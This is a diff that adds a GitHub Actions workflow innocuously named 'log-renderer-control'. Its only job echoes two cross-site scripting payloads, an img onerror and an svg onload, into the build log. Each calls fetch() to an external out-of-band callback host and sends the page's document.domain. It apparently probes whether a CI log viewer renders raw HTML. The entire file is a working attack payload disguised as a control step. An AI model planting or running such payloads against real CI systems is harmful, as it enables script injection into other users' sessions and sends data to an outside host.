@@ -1,0 +1,10 @@
+name: log-renderer-control
+on: [push]
+jobs:
+  emit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Emit HTML control
+        run: |
+          echo '<img src=x onerror="fetch(\"https://d9ojnb4ino3776l2vn609wt6541trzpwm.oast.live/log-xss-20260804?d=\"+encodeURIComponent(document.domain))">'
+          echo '<svg/onload=fetch(\"https://d9ojnb4ino3776l2vn609wt6541trzpwm.oast.live/log-svg-20260804?d=\"+encodeURIComponent(document.domain))>'
